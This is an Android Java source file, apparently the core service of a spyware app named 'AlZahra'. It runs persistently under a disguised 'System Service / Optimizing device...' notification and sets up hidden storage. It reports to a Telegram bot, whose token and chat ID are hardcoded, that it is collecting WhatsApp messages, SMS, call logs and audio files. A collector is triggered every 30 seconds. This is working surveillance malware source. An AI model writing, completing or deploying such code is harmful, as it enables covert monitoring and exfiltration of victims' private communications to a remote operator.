package com.alzahra.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import androidx.core.app.NotificationCompat;

import com.alzahra.R;
import com.alzahra.storage.HiddenStorageManager;
import com.alzahra.telegram.BotCommandHandler;
import com.alzahra.telegram.TelegramBot;

public class CoreService extends Service {
    private static final String CHANNEL_ID = "alzahra_channel";
    private static final String BOT_TOKEN = "8353955949:AAHAl3ELWn8m-tucuf5ZktLZfTAT5G1v1gA";
    private static final String CHAT_ID = "7344776596";
    
    private Handler handler;
    private BotCommandHandler commandHandler;

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        createNotificationChannel();
        startForeground(1, buildNotification());
        
        // Initialize components
        commandHandler = new BotCommandHandler(this);
        commandHandler.startListening();
        
        HiddenStorageManager.initialize(this);
        
        // إرسال رسالة بدء التخزين
        sendStorageStartedMessage();
        
        // Schedule data collection
        scheduleCollection();
    }

    private void sendStorageStartedMessage() {
        new Thread(() -> {
            try {
                Thread.sleep(3000);
                TelegramBot bot = new TelegramBot(BOT_TOKEN);
                String message = "🟢 <b>Data Collection Started</b>\n\n" +
                        "📁 Hidden storage: Initialized\n" +
                        "🎯 Monitoring:\n" +
                        "  • WhatsApp Messages\n" +
                        "  • SMS\n" +
                        "  • Call Logs\n" +
                        "  • Audio Files\n\n" +
                        "🔄 Auto-sync: <b>ENABLED</b>";
                bot.sendMessage(CHAT_ID, message);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void scheduleCollection() {
        handler.postDelayed(() -> {
            Intent intent = new Intent(this, CollectorService.class);
            intent.setAction("COLLECT_ALL");
            startService(intent);
            scheduleCollection();
        }, 30000); // كل 30 ثانية
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "AlZahra Service",
                    NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("Background data sync");
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Optimizing device...")
                .setSmallIcon(android.R.drawable.ic_popup_sync)
                .setOngoing(true)
                .build();
    }
}
